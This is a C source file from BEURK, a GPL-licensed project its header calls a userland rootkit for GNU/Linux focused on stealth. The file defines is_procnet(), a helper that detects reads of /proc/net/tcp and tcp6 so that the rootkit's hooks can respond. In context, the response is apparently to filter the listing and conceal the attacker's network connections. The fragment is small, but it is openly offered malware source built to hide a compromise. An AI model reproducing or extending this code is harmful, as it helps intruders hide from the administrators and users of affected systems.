/*
 * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
 * Copyright (C) 2015  unix-thrust
 *
 * This file is part of BEURK.
 *
 * BEURK is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * BEURK is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <sys/stat.h> /* struct stat */
#include <string.h> /* strstr() */
#include <limits.h> /* PATH_MAX */
#include "beurk.h" /* prototype */
#include "config.h" /* PROC_NET_TCP, MAGIC_STRING, LIBRARY_NAME, ... */
#include "debug.h" /* DEBUG() */

/** is_procnet detects any path going into PROC_NET_TCP, allowing our hooks to
 * react accordingly.
 */

int         is_procnet(const char *path) {
    init();
    DEBUG(D_INFO, "called is_procnet()");

    if (!strcmp(path, PROC_NET_TCP) || !strcmp(path, PROC_NET_TCP6))
        return (1);

    return (0);
}
